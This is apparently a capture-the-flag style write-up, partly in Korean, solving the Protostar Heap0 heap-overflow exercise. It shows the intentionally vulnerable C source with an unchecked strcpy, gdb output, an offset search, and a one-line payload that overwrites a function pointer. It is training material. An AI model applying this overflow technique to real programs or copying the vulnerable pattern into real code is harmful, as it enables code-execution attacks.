# Wargame / Protostar / Heap0

[Protostar Heap0 - Exploit Exercises](https://exploit-exercises.com/protostar/heap0/)

>This level introduces heap overflows and how they can influence code flow.
>
>This level is at /opt/protostar/bin/heap0


## Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));

  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);
  strcpy(d->name, argv[1]);

  f->fp();
}
```

## Analysis

```bash
$ ./heap0
data is at 0x804a008, fp is at 0x804a050
Segmentation fault
```


```
(gdb) p winner
$1 = {void (void)} 0x8048464 <winner>
(gdb) p nowinner
$2 = {void (void)} 0x8048478 <nowinner>
(gdb) p data
$3 = (struct here_cg_arc_record *) 0x0
(gdb) p &data
$4 = (struct here_cg_arc_record **) 0xb7fff884
```


`data[64]` 뒤에 `fp` function pointer 있을 것으로 생각되니깐... `64` bytes 이후에 `winner()` 함수 주소 설정.

```bash
$ $ ./heap0 $(python -c 'print "A"*64 + "\x64\x84\x04\x08"')
data is at 0x804a008, fp is at 0x804a050
level has not been passed
```

Exploit pattern 으로 다시 `fp` 주소 확인을 하면 72 bytes 뒤에 있네.

```bash
$ ./pattern.py 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

$ ./pattern.py 0x41346341
Pattern 0x41346341 first occurrence at position 72 in pattern.
```

## Exploit

```bash
$ ./heap0 $(python -c 'print "A"*72 + "\x64\x84\x04\x08"')
```



